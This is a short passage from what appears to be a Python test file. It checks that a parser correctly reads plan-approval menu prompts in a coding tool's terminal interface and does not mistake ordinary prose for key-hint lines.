    p = BlockedPrompt.parse(PLAN_APPROVAL.replace(line, ""))
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert [o.number for o in p.options] == [1, 2, 3]


def test_reading_chrome_by_its_key_does_not_read_prose_as_chrome() -> None:
    """The bar this could have lowered, and the reason it is a KEY test.

    ``_is_key_hint`` accepts a line only when the key-side names keys. Widening
    it to "a line with `to` in it" would swallow the paragraph a dialog is
    asking, and widening `_FOOTER_RE`'s verb list instead -- the other obvious
    fix -- would have had to guess at Claude Code's vocabulary once per release.
    """
    prose = "Ask the reviewer to approve the change\n"
    assert not _is_key_hint(prose)
    assert _is_key_hint("shift+tab to approve with this feedback")
    # A run interrupted by prose is still not a trailing run.
    interrupted = PLAN_APPROVAL.replace(SUB_LINE, "        " + prose)
    assert BlockedPrompt.parse(interrupted).options == ()
